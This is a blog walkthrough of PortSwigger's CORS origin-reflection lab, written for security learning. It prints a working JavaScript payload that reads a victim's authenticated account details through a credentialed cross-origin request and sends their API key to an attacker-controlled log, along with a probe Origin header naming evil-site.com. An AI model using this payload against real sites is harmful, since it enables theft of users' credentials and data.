---
title: PortSwigger Walkthrough - CORS vulnerability with basic origin reflection
date: 2026-08-25 20:00:00 +0200
categories: [Walkthrough, PortSwigger]
tags: [walkthrough, portswigger, bscp, cors]
author: diego
description: Walkthrough of PortSwigger's 'CORS vulnerability with basic origin reflection' lab.
image:
  path: /assets/img/posts/portswigger/portswigger.png
  alt: PortSwigger Web Security Academy
---

> To browse all labs in this series, visit the [full PortSwigger series](/categories/portswigger/).
{: .prompt-info }

> All testing shown in this series is performed against PortSwigger Academy's intentionally vulnerable labs.  
> Do not apply these techniques to systems you do not own or have explicit written permission to test.
{: .prompt-warning }

## What's this?
CORS (cross-origin resource sharing) is a browser mechanism that relaxes the same-origin policy in a controlled way, using a set of HTTP headers to say which origins are allowed to read a response. The simplest way to break it is when the server just reflects whatever `Origin` header the browser sent, instead of checking it against an actual allowlist. Slap `Access-Control-Allow-Credentials: true` on top of that reflection and literally any website can read your authenticated responses, cookies included.

## Objective
This app trusts all origins in its CORS config. Craft some JavaScript that uses CORS to steal the administrator's API key, host it on the exploit server, and submit the stolen key. Own account: `wiener:peter`.

> [PortSwigger's lab link](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
{: .prompt-info }

## Walkthrough
Log in with `wiener:peter` and check the `GET /accountDetails` request. The response carries `Access-Control-Allow-Credentials: true`, which is the first hint that CORS is in play here. Send the request to Repeater and add an arbitrary origin:

```
Origin: https://evil-site.com
```

The response reflects it right back in `Access-Control-Allow-Origin`:

![Origin header reflected back in the CORS response](/assets/img/posts/portswigger/cors/01-access-control-headers.png)

Confirmed: any origin is trusted, and credentials are allowed. Time to weaponize it. Head to the exploit server and drop this in the body (swap in your actual lab ID):

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

Deliver it to the victim, then check the access log. The administrator's session hit our page, the request fired with their cookies attached thanks to `withCredentials`, and their account details (API key included) landed in our log. Grab the `apikey` value and submit it. Lab solved.

![Lab solved confirmation](/assets/img/posts/portswigger/cors/02-lab-solved.png)

Textbook example of why blindly reflecting `Origin` is basically the same as setting `Access-Control-Allow-Origin: *`, except worse, because it lets credentials through too.

<br><br>
> Wanna talk? Contact me here!  
> <a href="javascript:void(0);" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" onclick="navigator.clipboard.writeText('diegofdlg@gmail.com');alert('Mail copied to the clipboard!')"><i class="fa-solid fa-envelope"></i></a>
> <a href="https://www.linkedin.com/in/diego-fidalgo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-linkedin"></i></a>
> <a href="https://x.com/0x_ch3ngo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>
> <a href="https://discord.com/users/149616662537043969" style="font-size:1.2rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-discord"></i></a>
{: .prompt-tip }
